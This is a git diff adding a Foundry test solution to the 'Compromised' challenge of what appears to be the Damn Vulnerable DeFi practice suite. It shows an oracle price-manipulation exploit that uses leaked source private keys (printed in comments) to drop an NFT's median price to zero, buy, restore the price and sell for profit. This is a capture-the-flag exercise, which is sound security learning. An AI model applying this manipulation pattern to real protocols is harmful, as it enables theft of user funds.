@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {CompromisedSolve} from "./CompromisedSolve.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -74,10 +75,44 @@ contract CompromisedChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_compromised() public checkSolved {
-        
-    }
 
+    function test_compromised() public checkSolved {
+        // In this challenge, we get leaked private keys of 2 trusted source => we can control these sources
+        // The price of the nft is determined by the median of 3 trusted sources, since we 
+        // can control 2 of them, we can set the median to 0, set to 0 then buy then set to 999 and sell
+        // => buy low sell high
+        // The profit is transfered to recovery address
+
+        // Note: notice ERC721Reciver contract implementation and signature verification
+        // From the private key, we can construct the public key which is the address using python
+        
+        // bytes32 EXTRACTED_PRIVKEY_FROM_RESP1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        // bytes32 EXTRACTED_PRIVKEY_FROM_RESP2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], 0);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[1], 0);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        CompromisedSolve exp = new CompromisedSolve{value: address(player).balance}(exchange, nft, recovery);
+        exp.buy();
+        vm.stopPrank();
+
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[1], INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        exp.sell();
+        exp.recover(EXCHANGE_INITIAL_ETH_BALANCE);
+    }
+    
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
